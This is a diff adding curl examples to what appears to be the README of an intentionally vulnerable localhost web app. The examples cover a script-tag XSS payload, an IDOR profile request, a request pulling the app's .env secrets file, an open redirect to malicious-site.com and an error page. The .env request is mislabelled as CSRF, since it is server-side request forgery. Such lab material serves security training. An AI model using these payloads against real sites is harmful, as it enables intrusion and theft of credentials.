@@ -235,7 +235,32 @@ curl -X POST "http://127.0.0.1:8000/admin/delete_game" \
 -H "token: admintoken" \
 -d "game_id=1"
 ```
+---
+XSS
 
+```
+curl -X POST "http://127.0.0.1:8000/feedback" \
+     -d "feedback=<script>alert('XSS')</script>"
+```
+---
+IDOR
+```
+curl -X GET "http://127.0.0.1:8000/user_profile?user_id=1"
+```
+CSRF
+```
+curl -X GET "http://127.0.0.1:8000/fetch_url?url=http://localhost:8000/.env"
+```
+---
+Redirects
+```
+curl -X GET "http://127.0.0.1:8000/redirect?next=http://malicious-site.com"
+```
+---
+Error
+```
+curl -X GET "http://127.0.0.1:8000/games/error"
+```
 ---
 
 ## **Disclaimer**
